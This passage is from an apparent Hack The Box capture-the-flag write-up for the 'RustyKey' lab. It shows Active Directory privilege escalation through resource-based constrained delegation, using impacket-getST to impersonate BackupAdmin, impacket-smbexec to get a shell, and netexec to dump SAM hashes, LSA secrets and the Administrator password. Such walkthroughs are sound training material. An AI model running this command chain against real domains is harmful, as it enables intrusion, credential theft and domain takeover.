BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
RUSTYKEY\DelegationManager                 Group            S-1-5-21-3316070415-896458127-4139322052-1136 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Privilege Escalation (Administrator)

With `AddAllowedToAct` permission we can abuse [(RBCD) Resource-based constrained](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

![Writeup-6.png](/assets/pentest/htb/rustykey/Writeup-6.png)

### AddAllowedToAct

DC doesn't allow anyone else to delegate so let's fix that.
```powershell
PS C:\Windows> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount

DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
DNSHostName                          : dc.rustykey.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
PrincipalsAllowedToDelegateToAccount : {}
SamAccountName                       : DC$
SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
UserPrincipalName                    :

PS C:\Windows> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount 'IT-Computer3$'
PS C:\Windows> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount | Select PrincipalsAllowedToDelegateToAccount

PrincipalsAllowedToDelegateToAccount
------------------------------------
{CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb}
```

### RBCD

```bash
â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k --generate-tgt it_comp3
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\IT-Computer3$:Rusty88!
SMB         dc.rustykey.htb 445    dc               [+] TGT saved to: it_comp3.ccache
SMB         dc.rustykey.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=it_comp3.ccache

â””â”€$ export KRB5CCNAME=it_comp3.ccache

â””â”€$ faketime -f +8h impacket-getST -spn 'cifs/dc.rustykey.htb' -impersonate 'DC$' -dc-ip '10.10.11.75' 'rustykey.htb/IT-Computer3$' -k -no-pass
[*] Impersonating DC$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC$@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache

â””â”€$ export KRB5CCNAME=DC\$@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache

â””â”€$ faketime -f +8h impacket-secretsdump -dc-ip '10.10.11.75' 'rustykey.htb'/'DC$'@'dc.rustykey.htb' -k -no-pass -just-dc-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Bind context rejected: invalid_checksum
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

Hmmm... If we try to impersonate the `DC$` machine to secretsdump it doesn't work ðŸ¤”

If we can't use `DC$` to dump hashes then we can target someone with higher privileges. 

![Writeup-7.png](/assets/pentest/htb/rustykey/Writeup-7.png)

We successfully impersonated `BackupAdmin`, they are part of **Enterprise Admins** so very desirable target.
```bash
â””â”€$ faketime -f +8h impacket-getST -spn 'cifs/dc.rustykey.htb' -impersonate 'BackupAdmin' -dc-ip '10.10.11.75' 'rustykey.htb/IT-Computer3$' -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating BackupAdmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in BackupAdmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache

â””â”€$ export KRB5CCNAME=BackupAdmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache

â””â”€$ faketime -f +8h netexec ldap dc.rustykey.htb -u 'BackupAdmin' -k --use-kcache
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\BackupAdmin from ccache (Pwn3d!)
```

Not positive why **DC** account failed, because in **Mirage** it worked flawlessly... Administrator also didn't work, most definitely it's a sensitive account.

![Writeup-8.png](/assets/pentest/htb/rustykey/Writeup-8.png)

### Root.txt

```bash
â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb -u 'BackupAdmin' -k --use-kcache -x 'type \Users\Administrator\Desktop\root.txt'
# No Output
â””â”€$ faketime -f +8h netexec wmi dc.rustykey.htb -u 'BackupAdmin' -k --use-kcache -x 'type \Users\Administrator\Desktop\root.txt'
# error: ('unpack requires a buffer of 2 bytes', "When unpacking field 'SecondaryAddrLen | <H&SecondaryAddr | b''[:2]'")

â””â”€$ ls /usr/bin/impacket*exec
ï€– /usr/bin/impacket-atexec  ï€– /usr/bin/impacket-dcomexec  ï€– /usr/bin/impacket-psexec  ï€– /usr/bin/impacket-smbexec  ï€– /usr/bin/impacket-wmiexec

â””â”€$ faketime -f +8h impacket-smbexec dc.rustykey.htb -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>type \Users\Administrator\Desktop\root.txt
975eb61ac707f9fe3a255af995bc4a68
```

### P.S.

```bash
â””â”€$ faketime -f +8h impacket-secretsdump dc.rustykey.htb -k -no-pass
# or
â””â”€$ faketime -f +8h netexec smb dc.rustykey.htb -u 'BackupAdmin' -k --use-kcache --sam --lsa
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\BackupAdmin from ccache (Pwn3d!)
SMB         dc.rustykey.htb 445    dc               [*] Dumping SAM hashes
SMB         dc.rustykey.htb 445    dc               Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::
SMB         dc.rustykey.htb 445    dc               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.rustykey.htb 445    dc               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[18:43:59] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesnt have hash information.                                                                         regsecrets.py:436
SMB         dc.rustykey.htb 445    dc               [+] Added 3 SAM hashes to the database
SMB         dc.rustykey.htb 445    dc               [+] Dumping LSA secrets
SMB         dc.rustykey.htb 445    dc               RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25
SMB         dc.rustykey.htb 445    dc               RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
SMB         dc.rustykey.htb 445    dc               RUSTYKEY\Administrator:Rustyrc4key#!
SMB         dc.rustykey.htb 445    dc               dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397
dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c
SMB         dc.rustykey.htb 445    dc               [+] Dumped 4 LSA secrets to /home/woyag/.nxc/logs/lsa/dc.rustykey.htb_None_2025-07-29_184345.secrets and /home/woyag/.nxc/logs/lsa/dc.rustykey.htb_None_2025-07-29_184345.cached
```